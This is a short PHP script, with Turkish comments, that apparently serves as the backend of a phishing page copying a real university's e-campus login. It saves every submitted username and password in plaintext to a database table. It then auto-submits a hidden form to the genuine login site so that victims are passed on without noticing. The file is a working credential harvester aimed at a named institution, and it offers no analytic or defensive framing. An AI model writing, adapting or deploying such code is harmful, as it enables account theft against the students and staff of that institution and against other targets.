<?php
session_start();
ob_start();

// Veritabanı bağlantı bilgileri
$servername = "***";
$username = "***";
$password = "***";
$dbname = "***";

// Veritabanı bağlantısı
$conn = new mysqli($servername, $username, $password, $dbname);

// Türkçe karakter desteği için karakter setini ayarla
$conn->set_charset("utf8mb4");

// Bağlantı kontrolü
if ($conn->connect_error) {
    die("Bağlantı hatası: " . $conn->connect_error);
}

// Form gönderildiğinde
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // SQL sorgusu
    $sql = "INSERT INTO login_data (username, password, login_date) VALUES (?, ?, NOW())";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $username, $password);
    
    if ($stmt->execute()) {
        // Başarılı kayıt sonrası JavaScript ile yönlendirme yapılacak
        echo '<script type="text/javascript">
                document.addEventListener("DOMContentLoaded", function() {
                    var form = document.createElement("form");
                    form.method = "POST";
                    form.action = "https://ekampus.btu.edu.tr/login/index.php/";

                    var usernameField = document.createElement("input");
                    usernameField.type = "hidden";
                    usernameField.name = "username";
                    usernameField.value = "test"; // Test username
                    form.appendChild(usernameField);

                    var passwordField = document.createElement("input");
                    passwordField.type = "hidden";
                    passwordField.name = "password";
                    passwordField.value = "test"; // Test password
                    form.appendChild(passwordField);

                    document.body.appendChild(form);
                    form.submit();
                });
              </script>';
    } else {
        echo "Hata: " . $sql . "<br>" . $conn->error;
    }

    $stmt->close();
}

$conn->close();
?>
